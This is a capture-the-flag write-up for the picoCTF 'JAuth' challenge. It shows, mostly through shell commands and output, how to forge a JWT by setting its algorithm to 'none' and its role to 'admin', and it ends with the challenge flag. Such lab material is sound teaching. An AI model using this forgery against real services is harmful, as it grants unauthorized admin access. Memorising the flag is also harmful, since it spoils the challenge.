# **_JAuth_**
## Description
>Can you identify the components and exploit the vulnerable one?
The website is running here. Can you become an admin?
You can login as test with the password Test123! to get started.

## Solution
Login with the given `test` username and password, there is a  `Json Web Token`, also known as `JWT`, which is used to verify identity, 
Decode it

`alg` states the cryptographic algorithm used to sign the token, change it's value to `none` so it won't check the signature
```console
❯ echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9" | base64 -d
{"typ":"JWT","alg":"HS256"}%
```
Note that there is a `role` set as `user`, which identifies the login privilege, set it to `admin` to get admin access
```console
❯ echo "eyJhdXRoIjoxNjU4MDM3Njk1MDMyLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDMuMC4wLjAgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjU4MDM3Njk1fQ" | base64 -d
{"auth":1658037695032,"agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36","role":"user","iat":1658037695}base64: invalid input
```
Last part is the signature, so it can't be decoded
```
❯ echo "JSEYU1qIJFimnegRY0IoWjj3MHQle8d3zEblGMeSZFE" | base64 -d
%!SZ�$X���cB(Z8�0t%{�w�F�ǒdQbase64: invalid input
```
Generate a `JWT` with the modified value
```console
❯ echo -n '{"typ":"JWT","alg":"none"}' | base64
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=
❯ echo -n '{"auth":1658037695032,"agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36","role":"admin","iat":1658037695}' | base64
eyJhdXRoIjoxNjU4MDM3Njk1MDMyLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEw
LjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENo
cm9tZS8xMDMuMC4wLjAgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY1ODAz
NzY5NX0=
```
Combine them into `JWT` format
>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNjU4MDM3Njk1MDMyLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDMuMC4wLjAgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY1ODAzNzY5NX0.

Put the value in `token` and get the flag
>picoCTF{succ3ss_@u7h3nt1c@710n_72bf8bd5}

